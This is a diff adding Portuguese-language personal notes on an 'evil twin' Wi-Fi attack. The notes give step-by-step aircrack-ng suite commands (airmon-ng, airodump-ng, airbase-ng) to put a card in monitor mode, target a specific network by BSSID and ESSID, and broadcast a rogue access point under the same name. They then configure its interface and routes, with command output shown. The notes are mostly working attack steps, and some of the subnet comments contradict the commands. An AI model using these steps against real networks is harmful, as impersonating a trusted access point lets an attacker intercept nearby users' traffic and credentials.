@@ -1,1 +1,83 @@
-.
+                                               Twuin Evil - > Forjar uma rede conhecida 
+                                               
+ airmon-ng start wlan0 - > modo monitor 
+ airodump-ng wlan0mon - > escutar ondas rádios 
+
+
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                           
+ 
+EC:4D:47:20:C7:58  -38       58      823    6   3  130   WPA2 CCMP   PSK  Casa 16  
+
+airodump-ng wlan0mon -c 3 - > selecionando o canal onde o alvo está. 
+ ALVO:
+ EC:4D:47:20:C7:58 - > BSSID 
+ Casa 16  - > ESSID 
+ 
+ airbase-ng --help 
+ 
+ --essids - > list of essids
+ -c - > canal 
+ -P - > responder a todos os probes 
+
+  nano lista.txt
+  Casa 16
+ 
+ airbase-ng --essids lista.txt -c 3 wlan0mon - > criando um AP
+ 17:32:53  Created tap interface at0
+ 17:32:53  Trying to set MTU on at0 to 1500
+ 17:32:53  Trying to set MTU on wlan0mon to 1800
+ 17:32:53  Access Point with BSSID 78:D3:8D:02:4D:06 started.
+ 
+ Created tap interface at0 - > interface de rede criada ( não configurada e sem acesso a internet ) 
+ at0 - > nossa interface de rede  
+ 
+ ifconfig at0 up - > ativando interface de rede 
+ ifconfig 
+
+at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::7ad3:8dff:fe02:4d06  prefixlen 64  scopeid 0x20<link>
+        ether 78:d3:8d:02:4d:06  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 6  bytes 516 (516.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+nossa rede - > 192.168.100.0/24 
+sub rede possivel - > 192.168.2.1/24 
+
+ifconfig at0 192.168.2.1/24 - > Defina que a interface at0 terá como gatway 192.168.100.1
+Observação: logo a rede será 192.168.100.0 
+
+route - > Ver as rotas de pacotes 
+
+Tabela de Roteamento IP do Kernel
+Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
+default         192.168.100.1   0.0.0.0         UG    100    0        0 eth0
+192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 at0
+192.168.100.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0
+
+defalt - > nosso gatway padrão 
+192.168.2.0 - > rede criada, porém em gatway 
+
+precisamos definir um gatway para 192.168.2.0 
+
+route - > rotas 
+add - > adicione 
+-net - > rede 
+netmask - > mascara 
+gw - > gatway 
+
+route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1 
+
+Tabela de Roteamento IP do Kernel
+Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
+default         192.168.100.1   0.0.0.0         UG    100    0        0 eth0
+192.168.2.0     192.168.2.1     255.255.255.0   UG    0      0        0 at0
+192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 at0
+192.168.100.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0
+
+temos uma rede 192.168.2.0 com o gatway 192.168.2.1 
+
+
+
+
